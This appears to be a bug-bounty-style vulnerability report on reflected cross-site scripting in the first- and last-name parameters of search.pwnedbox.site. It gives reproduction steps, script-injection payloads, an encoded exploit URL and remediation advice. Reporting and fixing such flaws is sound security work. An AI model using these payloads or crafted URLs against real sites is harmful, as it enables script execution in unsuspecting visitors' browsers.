## Title

Reflected XSS Through First Name and Last Name Fields

## Description

**Affected URL:** https://search.pwnedbox.site/

**Vulnerability Type:** Reflected Cross-Site Scripting (XSS)

**Affected Parameters:** `fname`, `lname`

The GET Parameter Reflection page accepts values in the First Name and Last Name fields. During testing, JavaScript supplied in these fields was executed after the form was submitted. This shows that the submitted values are not safely encoded before being returned to the browser.

## Steps to Reproduce

1. Open https://search.pwnedbox.site/.
2. In the **First Name** field, enter:

   ```html
   yash1'"><script>alert(1)</script>
   ```

3. In the **Last Name** field, enter:

   ```html
   yash2'"><script>alert(2)</script>
   ```

4. Click **Submit**.
5. Observe the first alert popup displaying `1`.
6. Close the first popup and observe the second alert displaying `2`.

## POC (Proof of Concept)

### Screenshot 1 – Payloads Entered in Both Fields

<!-- Add Screenshot 1 Here -->

### Screenshot 2 – First JavaScript Alert

<!-- Add Screenshot 2 Here -->

### Screenshot 3 – Second JavaScript Alert

<!-- Add Screenshot 3 Here -->

### Payloads Used

**First Name (`fname`):**

```html
yash1'"><script>alert(1)</script>
```

**Last Name (`lname`):**

```html
yash2'"><script>alert(2)</script>
```

### HTTP Request / URL

```http
https://search.pwnedbox.site/?fname=yash1%27%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&lname=yash2%27%22%3E%3Cscript%3Ealert%282%29%3C%2Fscript%3E
```

## Impact

An attacker could prepare a URL containing crafted values for the name fields and persuade another person to open it. If the vulnerable page processes those values in the same way, script code may run in that person's browser.

Possible consequences depend on the application's features and the victim's access. They may include:

- Showing misleading content in the page.
- Redirecting the visitor to an unwanted website.
- Presenting a fake form to collect information.
- Attempting actions within the victim's active session.

**Actual Impact:** Both test scripts executed successfully. The browser displayed two separate alert popups, first with `1` and then with `2`. No account takeover or data theft was tested.

**Potentially Affected Users:** Visitors who open a crafted URL targeting the `fname` and `lname` parameters.

## Remediation

- Apply context-appropriate output encoding to values from `fname` and `lname` before displaying them.
- Treat all URL parameters as untrusted input.
- Avoid inserting raw user-controlled values into HTML or unsafe DOM methods.
- Use a restrictive Content Security Policy (CSP) as an additional layer of protection.
